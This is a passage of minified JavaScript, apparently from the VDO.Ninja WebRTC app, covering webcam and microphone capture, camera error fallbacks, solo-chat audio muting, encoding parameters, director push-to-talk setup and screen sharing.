function(callback3,gumid){if(getUserMediaRequestID===gumid){if(makeImages(!0),getById("popupSelector_constraints_loading")&&(getById("popupSelector_constraints_loading").style.display="none"),"previewWebcam"==eleName&&document.getElementById("previewWebcam")){session.videoElement.controls=!0;try{var track0=session.streamSrc.getVideoTracks();track0.length&&((track0=track0[0]).getCapabilities?session.cameraConstraints=track0.getCapabilities():session.cameraConstraints={},log(session.cameraConstraints),track0.getSettings?(session.currentCameraConstraints=track0.getSettings(),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")&&session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches&&session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio)):session.currentCameraConstraints={},log(session.currentCameraConstraints))}catch(e){errorlog(e)}}else toggleSettingsState&&(log("16047"),updateConstraintSliders());if(callback3)try{var data={};data.UUID=callback3,data.videoOptions=listVideoSettingsPrep(),sendMediaDevices(data.UUID),session.sendMessage(data,data.UUID)}catch(e){}(iOS||iPad)&&toggleSpeakerMute(!0),session.forceAspectRatio&&await updateCameraConstraints("aspectRatio",session.forceAspectRatio),updateForceRotate(),(iOS||iPad)&&(document.getElementById("previewWebcam")||updateMixer());try{session.pip3&&(eleName.pip||(eleName.pip=!0,toggleSystemPip(session.videoElement,!0)))}catch(e){}dragElement(session.videoElement)}}),grabVideoPostTimeoutValue,callback2,gumID),log("DONE - found stream")})).catch((function(e){if(getUserMediaRequestID===gumID){if(warnlog(e),"OverconstrainedError"===e.name)warnlog(e.message||e),log("Resolution or frameRate didn't work");else{if("NotReadableError"===e.name)return void(quality<=10?(activatedPreview=!1,grabVideo(quality+1,eleName,selector)):session.facingMode?(session.facingMode=!1,activatedPreview=!1,grabVideo(!1,eleName,selector)):(session.cleanOutput||warnUser(iOS?"An error occured. Closing existing tabs in Safari may solve this issue.":"Error: Could not start video source.\n\nTypically this means the Camera is already be in use elsewhere. Most webcams can only be accessed by one program at a time.\n\nTry a different camera or perhaps try re-plugging in the device."),activatedPreview=!0,getById("gowebcam")&&(getById("gowebcam").innerHTML="Problem with Camera")));if("NavigatorUserMediaError"===e.name)return getById("gowebcam")&&(getById("gowebcam").innerHTML="Problem with Camera"),void(session.cleanOutput||warnUser("Unknown error: 'NavigatorUserMediaError'"));if("timedOut"===e.name)return activatedPreview=!0,getById("gowebcam")&&(getById("gowebcam").innerHTML="Problem with Camera"),void(session.cleanOutput||warnUser(e.message));errorlog("An unknown camera error occured")}quality<=10?(activatedPreview=!1,grabVideo(quality+1,eleName,selector)):session.facingMode?(session.facingMode=!1,activatedPreview=!1,grabVideo(!1,eleName,selector)):(errorlog("********Camera failed to work"),activatedPreview=!0,getById("gowebcam")&&(getById("gowebcam").innerHTML="Problem with Camera"),session.cleanOutput||(session.width||session.height||session.frameRate?warnUser("<i class='las la-exclamation-circle'></i> Camera failed to load.\n\nPlease ensure your camera supports the resolution and frameRate that has been manually specified. Perhaps use &quality=0 instead.",!1,!1):warnUser("<i class='las la-exclamation-circle'></i> Camera failed to load.\n\nPlease make sure it is not already in use by another application.\n\nPlease make sure you have accepted the camera permissions.",!1,!1)))}else warnlog("the previously selected camera attempted failed, but not a big deal, since its now void")})))}),delayStart,getUserMediaRequestID,callback)}else if(clearTimeout(grabVideoUserMediaTimeout),getUserMediaRequestID+=1,warnlog("ZZZ SET - so no VIDEO"),SelectedVideoInputDevices=[],saveSettings(),session.avatar&&session.avatar.ready?updateRenderOutpipe():session.mobile&&!document.getElementById("keepAlivePlayer")&&setInterval((function(){if(document.getElementById("keepAlivePlayer")&&session.streamSrc.getVideoTracks().length)getById("keepAlivePlayer").remove();else if(!document.getElementById("keepAlivePlayer")){let fakeElement=document.createElement("video");fakeElement.autoplay=!0,fakeElement.loop=!0,fakeElement.muted=!0,fakeElement.src="./media/micro.mp4",fakeElement.style.width="1px",fakeElement.style.height="1px",fakeElement.controls=!1,fakeElement.id="keepAlivePlayer",getById("main").appendChild(fakeElement)}}),4e3),"previewWebcam"==eleName&&document.getElementById("previewWebcam")){if(session.autostart)return void publishWebcam();log("4462"),updateStats(),document.getElementById("gowebcam")&&(document.getElementById("gowebcam").dataset.ready="true","true"==document.getElementById("gowebcam").dataset.audioready&&(document.getElementById("gowebcam").disabled=!1,miniTranslate(document.getElementById("gowebcam"),"start"),document.getElementById("gowebcam").focus()))}else{if(session.avatar&&session.avatar.ready)return void updateRenderOutpipe();if(session.chunked){for(UUID in session.pcs)session.chunkedStream(UUID);return}try{var miscSenders=[];session.whipOut&&session.whipOut.getSenders&&miscSenders.push(session.whipOut),miscSenders.forEach((dataRTC=>{dataRTC&&dataRTC.getSenders&&dataRTC.getSenders().forEach((sender=>{if(sender.track&&"video"==sender.track.kind){var trk=getMeshcastCanvasTrack(dataRTC);if(session.screenShareState&&session.screenshareContentHint&&"video"===trk.kind)try{trk.contentHint=session.screenshareContentHint}catch(e){errorlog(e)}else if(session.contentHint&&"video"===trk.kind)try{trk.contentHint=session.contentHint}catch(e){errorlog(e)}try{sender.replaceTrack(trk)}catch(e){errorlog(e)}}}))}))}catch(e){errorlog(e)}for(UUID in session.pcs){if(!("realUUID"in session.pcs[UUID]))getSenders2(UUID).forEach((sender=>{sender.track&&"video"==sender.track.kind&&(sender.track.enabled=!1,getById("mutevideobutton").classList.add("hidden"))}))}var msg={videoMuted:!0};session.sendMessage(msg)}}}else log("activated preview return 2")}function updateRenderOutpipe(){if(log("updateRenderOutpipe()"),session.canvasWebGL&&(session.canvasWebGL.remove(),session.canvasWebGL=null),session.canvasSource&&session.canvasSource.srcObject.getTracks().forEach((function(trk){session.canvasSource.srcObject.removeTrack(trk)})),session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getVideoTracks().forEach((function(track){session.videoElement.srcObject.removeTrack(track)})):checkBasicStreamsExist(),session.streamSrc){var tracks=session.streamSrc.getVideoTracks();if(!tracks.length||session.videoMuted)if((tracks=setAvatarImage(tracks)).length)!tracks.length||session.cleanOutput||session.cleanish||getById("mutevideobutton").classList.remove("hidden"),tracks.forEach((function(track){if(session.videoElement.srcObject.addTrack(track),session.avatar&&session.avatar.tracks){var msg={videoMuted:!1};session.sendMessage(msg)}else toggleVideoMute(!0);pushOutVideoTrack(track)}));else{var msg={videoMuted:!0};session.sendMessage(msg),session.videoElement.load(),getById("mutevideobutton").classList.add("hidden")}else tracks.length&&(applyMirror(session.mirrorExclude),tracks.forEach((function(track){track=applyEffects(track),session.videoElement.srcObject.addTrack(track),toggleVideoMute(!0),pushOutVideoTrack(track)})),!tracks.length||session.cleanOutput||session.cleanish||getById("mutevideobutton").classList.remove("hidden"))}}function pushOutVideoTrack(track){if(log("pushOutVideoTrack"),pokeIframeAPI("push-video-track",track.id,!1,session.streamID),session.chunked)for(UUID in session.pcs)session.chunkedStream(UUID);else{if(session.audioContentHint&&"audio"===track.kind){errorlog("this shouldn't occur, since only video tracks are expected");try{track.contentHint=session.audioContentHint}catch(e){errorlog(e)}}if(session.screenShareState&&session.screenshareContentHint&&"video"===track.kind)try{track.contentHint=session.screenshareContentHint}catch(e){errorlog(e)}else if(session.contentHint&&"video"===track.kind)try{track.contentHint=session.contentHint}catch(e){errorlog(e)}for(UUID in session.whipOut&&session.whipOut.getSenders&&session.whipOut.getSenders().forEach((sender=>{sender.track&&"video"==sender.track.kind&&(errorlog("Replacing track"),sender.replaceTrack(track))})),session.pcs){var videoAdded=!1;try{if("realUUID"in session.pcs[UUID])continue;if(1==session.pcs[UUID].guest&&0===session.roombitrate)log("room rate restriction detected. No videos will be published to other guests");else if(1==session.pcs[UUID].allowVideo){var added=!1;getSenders2(UUID).forEach((sender=>{added||sender.track&&"video"==sender.track.kind&&(sender.replaceTrack(track),log("Track replaced"),log(track),sender.track.enabled=!0,added=!0)})),0==added&&(videoAdded=!0,session.pcs[UUID].addTrack(track,session.videoElement.srcObject),setTimeout((function(uuid){session.optimizeBitrate(uuid)}),session.rampUpTime,UUID))}}catch(e){errorlog(e)}(iOS||iPad)&&(SafariVersion&&SafariVersion<=13||videoAdded&&(setTimeout((function(uuid){session.setScale(uuid,null)}),2e3,UUID),setTimeout((function(uuid){var scale=100;session.setScale,session.pcs[uuid].scale&&(scale=session.pcs[uuid].scale),session.setScale(uuid,scale)}),5e3,UUID)))}"audio"===track.kind&&session.applyIsolatedChat(),session.refreshScale()}}async function grabAudio(selector="#audioSource",trackid=null,override=!1,callbackUUID=!1,callback=!1){if(1!=activatedPreview){activatedPreview=!0,log("TRACK EXCLUDED:"+trackid);try{var baseTest=document.querySelector(selector);if(!baseTest)return void errorlog("No audio source menu");if(baseTest&&"UL"==baseTest.tagName)for(var audioSelect=baseTest.querySelectorAll("input"),audioExcludeList=[],i=0;i<audioSelect.length;i++)try{"screen"==audioSelect[i].dataset.type&&audioSelect[i].checked&&audioExcludeList.push(audioSelect[i])}catch(e){errorlog(e)}else if(baseTest&&"SELECT"==baseTest.tagName)for(audioExcludeList=[],audioSelect=baseTest.options,i=0;i<audioSelect.length;i++)try{"screen"==audioSelect[i].dataset.type&&audioSelect[i].selected&&audioExcludeList.push(audioSelect[i])}catch(e){errorlog(e)}}catch(e){errorlog(e)}try{session.videoElement&&session.videoElement.srcObject?session.videoElement.srcObject.getAudioTracks().forEach((function(track){for(var i=0;i<audioExcludeList.length;i++)try{if(audioExcludeList[i].label==track.label)return void warnlog("DONE")}catch(e){errorlog(e)}trackid&&track.id==trackid?warnlog("SKIPPED EXCLUDED TRACK?"):(session.videoElement.srcObject.removeTrack(track),track.stop())})):checkBasicStreamsExist()}catch(e){errorlog(e)}try{session.streamSrc?session.streamSrc.getAudioTracks().forEach((function(track){for(var i=0;i<audioExcludeList.length;i++)try{if(audioExcludeList[i].label==track.label)return void warnlog("EXCLUDING TRACK; PROBABLY SCREEN SHARE")}catch(e){errorlog(e)}trackid&&track.id==trackid?warnlog("SKIPPED EXCLUDED TRACK?"):(session.streamSrc.removeTrack(track),track.stop())})):checkBasicStreamsExist()}catch(e){errorlog(e)}try{session.streamSrcClone&&session.streamSrcClone.getAudioTracks().forEach((function(track){for(var i=0;i<audioExcludeList.length;i++)try{if(audioExcludeList[i].label==track.label)return void warnlog("EXCLUDING TRACK; PROBABLY SCREEN SHARE")}catch(e){errorlog(e)}trackid&&track.id==trackid?warnlog("SKIPPED EXCLUDED TRACK?"):(session.streamSrcClone.removeTrack(track),track.stop())}))}catch(e){errorlog(e)}var streams=await getAudioOnly(selector,trackid,override);try{log("STREAMS: "+streams.length);for(i=0;i<streams.length;i++)streams[i].getAudioTracks().forEach((function(track){try{session.streamSrc.addTrack(track),track.onended=function(){errorlog("Track ended unexpectedly"),session.cleanOutput||toggleSettings(!0)},log("ok?")}catch(e){errorlog(e)}}))}catch(e){errorlog(e)}Firefox&&!FirefoxEnumerated&&session.streamSrc&&session.streamSrc.getTracks().length&&(FirefoxEnumerated=!0,enumerateDevices().then(gotDevices)),callback&&callback(),senderAudioUpdate(callbackUUID)}else log("activated preview return 2")}session.toggleSoloChat=function(UUID,event=!1){if(session.director&&!session.directorEnabledPPT)return warnUser("Enable the director's microphone first.",2e3),!1;Firefox&&warnlog("Solo talk support for Firefox is currently experimental");var msg={micIsolate:!1};session.soloChatUUID.includes(UUID)?(session.soloChatUUID.splice(session.soloChatUUID.indexOf(UUID),1),msg.lowerVolume=!1):(session.soloChatUUID.push(UUID),msg.lowerVolume=!0),event&&(event.ctrlKey||event.metaKey)&&session.soloChatUUID.includes(UUID)&&(msg.micIsolate=1),session.sendRequest(msg,UUID),log(session.soloChatUUID);var ele=document.querySelector('[data-action-type="solo-chat"][data--u-u-i-d="'+UUID+'"]');log(ele);var ret=0;return session.soloChatUUID.includes(UUID)?msg.micIsolate?(ret=2,ele.classList.add("altpress"),ele.value=2):(ret=1,ele.value=1):(ele.classList.remove("pressed"),ele.ariaPressed="false",ele.classList.remove("altpress"),ele.value=0),session.applySoloChat(!1),ret},session.togglePrivateChat=function(ele){var msg={};warnlog(ele),0==ele.value?(msg.micIsolate=!0,ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true"):(msg.micIsolate=!1,ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false"),session.sendRequest(msg,ele.dataset.UUID),warnlog(msg)},session.applyIsolatedVolume=function(){for(var i=session.lowerVolume.length;i--;)session.lowerVolume[i]in session.rpcs||session.lowerVolume.splice(i,1);var soloMode=!1;if(session.lowerVolume.length&&(soloMode=!0),soloMode)for(var UUID in session.rpcs)session.lowerVolume.includes(UUID)?session.rpcs[UUID].videoElement&&!1!==session.rpcs[UUID].savedVolume&&(session.rpcs[UUID].videoElement.volume=session.rpcs[UUID].savedVolume,session.rpcs[UUID].savedVolume=!1):session.rpcs[UUID].videoElement&&0==session.rpcs[UUID].savedVolume&&(session.rpcs[UUID].savedVolume=session.rpcs[UUID].videoElement.volume,session.rpcs[UUID].videoElement.volume=.25*session.rpcs[UUID].savedVolume);else for(var UUID in session.rpcs)session.rpcs[UUID].videoElement&&!1!==session.rpcs[UUID].savedVolume&&(session.rpcs[UUID].videoElement.volume=session.rpcs[UUID].savedVolume,session.rpcs[UUID].savedVolume=!1)},session.applyIsolatedChat=function(UUID=!1){log("applyIsolatedChat"),session.applyIsolatedVolume();for(var i=session.micIsolated.length;i--;)session.micIsolated[i]in session.pcs||session.micIsolated[i]in session.rpcs||session.micIsolated.splice(i,1);var muteList=[...session.micIsolated],soloMode=!1;if(session.micIsolatedAutoMute&&(soloMode=!0,session.micIsolatedAutoMute.forEach((uid=>{muteList.includes(uid)||!(uid in session.rpcs)&&!(uid in session.pcs)||muteList.push(uid)}))),muteList.length&&(soloMode=!0),session.cleanOutput||(soloMode?(getById("header").classList.add("orange"),getById("head6").classList.remove("hidden")):0===session.audioGain||(getById("header").classList.remove("orange"),getById("head6").classList.add("hidden"))),null!==session.directorSpeakerMuted){for(var uuid in session.rpcs)try{var receivers=getReceivers2(uuid);for(i=0;i<receivers.length;i++)"audio"==receivers[i].track.kind&&(receivers[i].track.enabled=!session.directorSpeakerMuted)}catch(e){errorlog(e)}session.directorSpeakerMuted&&(getById("videosource").muted=!0)}if(UUID)try{getSenders2(UUID).forEach((sender=>{if(sender.track&&"audio"===sender.track.kind){var settings={};soloMode?muteList.indexOf(UUID)>=0?(settings.active=!0,session.pcs[UUID].audioMutedOverride=!1):(log("MUTING via session.applyIsolatedChat"),settings.active=!1,session.pcs[UUID].audioMutedOverride=!0):(settings.active=!0,session.pcs[UUID].audioMutedOverride=!1),setEncodings(sender,settings)}}))}catch(e){errorlog(e)}else for(var UUID in session.pcs)try{getSenders2(UUID).forEach((sender=>{if(sender.track&&"audio"===sender.track.kind){var settings={};soloMode?muteList.indexOf(UUID)>=0?(settings.active=!0,session.pcs[UUID].audioMutedOverride=!1):(log("MUTING via session.applyIsolatedChat"),settings.active=!1,session.pcs[UUID].audioMutedOverride=!0):(settings.active=!0,session.pcs[UUID].audioMutedOverride=!1),setEncodings(sender,settings)}}))}catch(e){errorlog(e)}};var FirefoxSenders={};function setEncodings(sender,settings=null,callback=null,cbarg=null){if(settings)"encodingsQueue"in sender?sender.encodingsQueue.push([settings,callback,cbarg]):sender.encodingsQueue=[[settings,callback,cbarg]];else{if(!sender.encodingsQueue)return;if(!sender.encodingsQueue.length)return}if(!sender.encodingsQueueActive)try{sender.encodingsQueueActive=!0;var options=sender.encodingsQueue.shift();settings=options[0],callback=options[1],cbarg=options[2];const params=sender.getParameters();params.encodings&&0!=params.encodings.length||(params.encodings=[{}]);var changed=!1;for(var setting in settings)null===settings[setting]?setting in params.encodings[0]&&(delete params.encodings[0][setting],changed=!0):(setting in params.encodings[0]?params.encodings[0][setting]!==settings[setting]&&(changed=!0):changed=!0,params.encodings[0][setting]=settings[setting]);if(log(settings),!changed&&!Firefox&&!SafariVersion)return log("SET ENCODINGS MATCH INPUT; skipping"),callback&&(cbarg?setTimeout((function(){callback(cbarg)}),0):setTimeout((function(){callback()}),0)),sender.encodingsQueueActive=!1,void setEncodings(sender);if(!Firefox||Firefox>=110){if(Firefox&&"track"in sender&&"kind"in sender.track&&"audio"==sender.track.kind&&"active"in settings&&(warnlog("Firefox does not support track active state with AUDIO yet... We will use enable/disable for that instead."),FirefoxSenders.sender?!1===FirefoxSenders.sender.lastState?FirefoxSenders.sender.activeState=settings.active:(FirefoxSenders.sender.activeState=settings.active,sender.track.enabled=settings.active):(FirefoxSenders.sender={lastState:sender.track.enabled,activeState:settings.active},sender.track.enabled=settings.active),delete settings.active,!Object.keys(settings).length))return callback&&(cbarg?setTimeout((function(){callback(cbarg)}),0):setTimeout((function(){callback()}),0)),log("COMPELTED FIREFOX SET ENCODINGS"),sender.encodingsQueueActive=!1,void setEncodings(sender)}else if("active"in settings&&(warnlog("Firefox does not support track active state. We will use enable/disable for that instead."),FirefoxSenders.sender?!1===FirefoxSenders.sender.lastState?FirefoxSenders.sender.activeState=settings.active:(FirefoxSenders.sender.activeState=settings.active,sender.track.enabled=settings.active):(FirefoxSenders.sender={lastState:sender.track.enabled,activeState:settings.active},sender.track.enabled=settings.active),delete settings.active,!Object.keys(settings).length))return callback&&(cbarg?setTimeout((function(){callback(cbarg)}),0):setTimeout((function(){callback()}),0)),log("COMPELTED FIREFOX SET ENCODINGS"),sender.encodingsQueueActive=!1,void setEncodings(sender);sender.setParameters(params).then((()=>{callback&&(cbarg?setTimeout((function(){callback(cbarg)}),0):setTimeout((function(){callback()}),0)),sender.encodingsQueueActive=!1,setEncodings(sender)})).catch((e=>{errorlog(e),sender.encodingsQueueActive=!1,setEncodings(sender)}))}catch(e){errorlog(e),sender.encodingsQueueActive=!1}}function senderAudioUpdate(callback=!1,tracks=!1){try{for(UUID in tracks||(checkBasicStreamsExist(),tracks=session.videoElement.srcObject.getAudioTracks()),session.audioContentHint&&tracks.length&&tracks.forEach((trk=>{try{trk.contentHint=session.audioContentHint}catch(e){errorlog(e)}})),session.whipOut&&session.whipOut.getSenders&&tracks.length&&session.whipOut.getSenders().forEach((sender=>{sender.track&&"audio"==sender.track.kind&&tracks.forEach((trk=>{sender.replaceTrack(trk)}))})),session.pcs)if(!("realUUID"in session.pcs[UUID])&&1==session.pcs[UUID].allowAudio){var senders=getSenders2(UUID);if(session.mixMinus){log("mixMinus START ..");var STRM=mixMinusAudio(UUID);if(!STRM)continue;STRM.getAudioTracks().forEach((trk=>{session.audioContentHint&&(trk.contentHint=session.audioContentHint);var added=!1;senders.forEach((sender=>{added?sender.track&&"audio"==sender.track.kind&&(sender.track.enabled=!1):sender.track&&"audio"==sender.track.kind&&(sender.replaceTrack(trk),sender.track.enabled=!0,added=!0,warnlog("ADDED 5"))})),added||session.pcs[UUID].addTrack(trk,STRM)}));continue}if(senders.forEach((sender=>{var good=!1;sender.track&&sender.track.id&&"audio"==sender.track.kind&&(tracks.forEach((function(track){track.id==sender.track.id&&(good=!0)})),good||(sender.track.enabled=!1))})),tracks.length)tracks.forEach((function(track){var matched=!1;if(getSenders2(UUID).forEach((sender=>{sender.track&&sender.track.id&&"audio"==sender.track.kind&&(warnlog(sender.track.id+" "+track.id),sender.track.id==track.id&&(warnlog("MATCHED 1"),matched=!0))})),!matched){var added=!1;if(getSenders2(UUID).forEach((sender=>{added||sender.track&&"audio"==sender.track.kind&&0==sender.track.enabled&&(sender.replaceTrack(track),sender.track.enabled=!0,added=!0,warnlog("ADDED 2"))})),!added)session.pcs[UUID].addTrack(track,session.videoElement.srcObject)}}));else(senders=getSenders2(UUID)).forEach((sender=>{sender.track&&"audio"==sender.track.kind&&(sender.track.enabled=!1)}))}!1!==session.director&&session.applySoloChat(),session.applyIsolatedChat();try{toggleSettingsState&&updateConstraintSliders()}catch(e){}if(callback)try{var data={};data.UUID=callback,data.audioOptions=listAudioSettingsPrep(),sendMediaDevices(data.UUID),session.sendMessage(data,data.UUID)}catch(e){}}catch(e){errorlog(e)}document.getElementById("gowebcam")&&(document.getElementById("gowebcam").dataset.audioready=!0,document.getElementById("gowebcam").dataset.ready&&"true"==document.getElementById("gowebcam").dataset.ready&&(document.getElementById("gowebcam").disabled=!1,miniTranslate(document.getElementById("gowebcam"),"start"),document.getElementById("gowebcam").focus()))}async function press2talk(clean=!1){var ele=getById("press2talk");if(ele.style.minWidth="127px",ele.style.padding="7px",getById("settingsbutton").classList.remove("hidden"),!document.getElementById("controls_director")&&session.showDirector&&createDirectorOnlyBox(),session.taintedSession){var msg={virtualHangup:!1};session.sendMessage(msg)}if(log("DIRECTOR STREAM SETUP"),1!=getById("press2talk").dataset.enabled){getById("press2talk").dataset.enabled=!0,getById("press2talk").outerHTML="",getById("mutebutton").classList.remove("hidden"),getById("hangupbutton2").classList.remove("hidden"),session.showDirector||!1===session.recordLocal||getById("recordLocalbutton").classList.remove("hidden"),3===session.screenshareType?(getById("screenshare3button").className="float",getById("screensharebutton").className="float hidden",getById("screenshare2button").className="float hidden"):1===session.screenshareType?(getById("screensharebutton").className="float",getById("screenshare3button").className="float hidden",getById("screenshare2button").className="float hidden"):2===session.screenshareType?(getById("screenshare2button").className="float",getById("screensharebutton").className="float hidden",getById("screenshare3button").className="float hidden"):null===session.broadcast?(getById("screensharebutton").className="float",getById("screenshare2button").className="float hidden",getById("screenshare3button").className="float hidden"):(getById("screensharebutton").className="float hidden",getById("screenshare2button").className="float hidden",getById("screenshare3button").className="float"),checkBasicStreamsExist(),session.videoElement.id="videosource",session.videoElement.dataset.menu="context-menu-video",session.streamID&&(session.videoElement.dataset.sid=session.streamID),session.videoElement.muted=!0,session.videoElement.autoplay=!0,session.videoElement.controls=session.showControls||!1,session.videoElement.setAttribute("playsinline",""),document.getElementById("videoContainer_director")?getById("videoContainer_director").appendChild(session.videoElement):getById("miniPerformer").appendChild(session.videoElement),session.screenShareElement&&document.getElementById("videoScreenContainer_director")?getById("videoScreenContainer_director").appendChild(session.screenShareElement):session.screenShareElement&&getById("miniPerformer").appendChild(session.screenShareElement),session.videoElement.title="This is the preview of the Director's audio and video output.",session.videoElement.onpause=event=>{event.ctrlKey||event.metaKey||(log("Video paused; auto playing"),event.currentTarget.play().then((_=>{log("playing 9")})).catch(warnlog))},session.videoElement.addEventListener("click",(function(e){log("click");try{if(e.ctrlKey||e.metaKey){e.preventDefault();var[menu,innerMenu]=statsMenuCreator();return menu.interval=setInterval(printMyStats,session.statsInterval,innerMenu),printMyStats(innerMenu),e.stopPropagation(),!1}}catch(e){errorlog(e)}})),updatePushId();var constraint={video:!1,audio:!0};session.videoDevice&&(constraint.video=!0),0===session.audioDevice&&(constraint.audio=!1),requestBasicPermissions(constraint,(function(){log("requestBasicPermissions done"),enumerateDevices().then(gotDevices).then((async function(){log("enumerateDevices+gotDevices complete"),pokeIframeAPI("director-share",!0,!1,session.streamID),log("session.directorEnabledPPT: "+session.directorEnabledPPT),session.directorEnabledPPT||(0!==session.audioDevice&&(log("SETTING AUDIO DEVICE!!"),activatedPreview=!1,await grabAudio("#audioSource3")),0!==session.videoDevice&&(activatedPreview=!1,!1!==session.quality?await grabVideo(session.quality,"videosource","#videoSource3"):await grabVideo(session.quality_wb||0,"videosource","#videoSource3")),session.videoMutedFlag&&(session.videoMuted=!0,toggleVideoMute(!0)),session.directorEnabledPPT=!0,toggleMute(!0),log("session.seeding: "+session.seeding),session.seeding?setTimeout((function(){meshcast()}),1e3):((session.autorecord||session.autorecordlocal)&&(log("AUTO RECORD START"),setTimeout((function(v){var videoKbps=4e3;!1!==session.recordLocal&&(videoKbps=session.recordLocal),session.director?recordVideo(document.querySelector("[data-action-type='recorder-local'][data-sid='"+session.streamID+"']"),null,videoKbps):v.stopWriter||v.recording||(v.startWriter?v.startWriter():recordLocalVideo(null,videoKbps,v))}),2e3,session.videoElement)),session.seeding=!0,await session.seedStream()))}))}))}else log("already enabled")}function statsMenuCreator(){getById("menuStatsBox")&&(clearInterval(getById("menuStatsBox").interval),getById("menuStatsBox").remove());var menu=document.createElement("div");menu.id="menuStatsBox",menu.className="debugStats remotestats",getById("main").appendChild(menu),menu.style.left=parseInt(10*Math.random())+15+"px",menu.style.top=parseInt(10*Math.random())+"px",menu.innerHTML="<h1 data-translate='statistics'>Statistics</h1>";var menuCloseBtn=document.createElement("button");menuCloseBtn.className="close",menuCloseBtn.innerHTML="Ã—",menu.appendChild(menuCloseBtn);var innerMenu=document.createElement("div");return menu.appendChild(innerMenu),menuCloseBtn.addEventListener("click",(function(eve){clearInterval(menu.interval),eve.currentTarget.parentNode.remove(),eve.preventDefault(),eve.stopPropagation()})),[menu,innerMenu]}function stickyMessage(message){var textOverlay=getById("stickyMsgs");if(textOverlay){var spanOverlay=document.createElement("span");spanOverlay.innerHTML=message;var closeBtn=document.createElement("button");closeBtn.className="overlayCloseBtn",closeBtn.innerText="X",closeBtn.onclick=function(){this.parentNode.remove()},textOverlay.appendChild(spanOverlay),spanOverlay.appendChild(closeBtn),textOverlay.classList.remove("hidden")}}async function publishScreen2(constraints,audioList=[],audio=!0,overrideFramerate=!1){if(log("SCREEN SHARE SETUP"),!navigator.mediaDevices.getDisplayMedia)return setTimeout((function(){iOS||iPad?warnUser("Sorry, but your iOS browser does not support screen-sharing.\n\nPlease see <a href='https://docs.vdo.ninja/guides/screen-share-your-iphone-ipad' target='_blank'>this guide</a> for an alternative method to do so.",!1,!1):session.mobile?warnUser("Sorry, your browser does not support screen-sharing.\n\nThe <a href='https://docs.vdo.ninja/getting-started/native-mobile-app-versions#android-download-link' target='_blank'>Android native app</a> should support it though.",!1,!1):warnUser("Sorry, your browser does not support screen-sharing.\n\nPlease use the desktop versions of Firefox or Chrome instead.")}),1),!1;if(navigator.userAgent.toLowerCase().indexOf(" electron/")>-1&&!ElectronDesktopCapture)return session.cleanOutput&&0==session.cleanish||warnUser("Enable Elevated Privileges to allow screen-sharing. (right click this window to see that option)"),!1;for(var streams=[],i=1;i<audioList.length;i++)if(audioList[i].selected){var constraint={video:!1,audio:{deviceId:{exact:audioList[i].value}}};!1===session.echoCancellation?constraint.audio.echoCancellation=!1:constraint.audio.echoCancellation=!0,!1===session.autoGainControl?constraint.audio.autoGainControl=!1:constraint.audio.autoGainControl=!0,!1===session.noiseSuppression?constraint.audio.noiseSuppression=!1:constraint.audio.noiseSuppression=!0,session.audioInputChannels&&(!0===constraint.audio?(constraint.audio={},constraint.audio.channelCount=session.audioInputChannels):constraint.audio&&(constraint.audio.channelCount=session.audioInputChannels)),session.micSampleRate&&(!0===constraint.audio?(constraint.audio={},constraint.audio.sampleRate=parseInt(session.micSampleRate)):constraint.audio&&(constraint.audio.sampleRate=parseInt(session.micSampleRate))),session.micSampleSize&&(!0===constraint.audio?(constraint.audio={},constraint.audio.sampleSize=parseInt(session.micSampleSize)):constraint.audio&&(constraint.audio.sampleSize=parseInt(session.micSampleSize)));var gumID=getUserMediaRequestID+=1;warnlog("navigator.mediaDevices.getUserMedia starting..."),await navigator.mediaDevices.getUserMedia(constraint).then((stream=>{if(getUserMediaRequestID!==gumID)return warnlog("GET USER MEDIA CALL HAS EXPIRED 3"),void stream.getTracks().forEach((function(track){stream.removeTrack(track),track.stop(),log("stopping old track")}));streams.push(stream)})).catch(errorlog)}0===session.audioDevice&&(constraints.audio=!1),session.screenshareVideoOnly&&(constraints.audio=!1),!1!==constraints.video&&0==Object.keys(constraints.video).length&&(constraints.video=!0),log(constraints);gumID=getUserMediaRequestID+=1;return navigator.mediaDevices.getDisplayMedia(constraints).then((async function(stream){if(getUserMediaRequestID!==gumID)return warnlog("GET USER MEDIA CALL HAS EXPIRED 3"),void stream.getTracks().forEach((function(track){stream.removeTrack(track),track.stop(),log("stopping old track")}));try{var constraint={};session.forceAspectRatio&&null===session.forceScreenShareAspectRatio?constraint.aspectRatio=parseFloat(session.forceAspectRatio):session.forceScreenShareAspectRatio&&(constraint.aspectRatio=parseFloat(session.forceScreenShareAspectRatio)),overrideFramerate&&(constraint.frameRate=overrideFramerate),Object.keys(constraint).length&&(await stream.getVideoTracks()[0].applyConstraints({advanced:[constraint]}),log({advanced:[constraint]}))}catch(e){errorlog(e)}session.screenShareState=!0,pokeIframeAPI("screen-share-state",session.screenShareState,null,session.streamID),notifyOfScreenShare();try{stream.getVideoTracks()[0].onended=function(){toggleScreenShare()}}catch(e){log("No Video selected; screensharing?")}!1!==session.roomid?(""!==session.roomid||session.view&&""!==session.view)&&(getById("head3").classList.add("hidden"),getById("head3a").classList.add("hidden"),log("ROOMID EANBLED"),log("Update Mixer Event on REsize SET"),window.onresize=updateMixer,window.onorientationchange=function(){Firefox&&updateForceRotate(!0),setTimeout((async function(){session.forceAspectRatio&&await updateCameraConstraints("aspectRatio",session.forceAspectRatio),session.effect&&"7"===session.effect&&digitalZoom(!0),updateForceRotate(),updateMixer()}),200)},joinRoom(session.roomid)):(getById("head3").classList.remove("hidden"),getById("head3a").classList.remove("hidden"),getById("logoname").style.display="none"),updatePushId(),stream.getAudioTracks().length&&(screenShareAudioTrack=stream.getAudioTracks()[0]),log("adding tracks");for(var i=0;i<streams.length;i++)streams[i].getAudioTracks().forEach((track=>{stream.addTrack(track)}));streams=null,session.screenshareVideoOnly||0===session.audioDevice||0==stream.getAudioTracks().length&&(session.cleanOutput||navigator.userAgent.toLowerCase().indexOf(" electron/")>-1||setTimeout((function(){warnUser(getTranslation("no-audio-source-detected"))}),300));try{session.streamSrc=stream}catch(e){errorlog(e)}toggleMute(!0);var v=createVideoElement();session.videoElement=v,session.streamID&&(session.videoElement.dataset.sid=session.streamID);var container=document.createElement("div");return 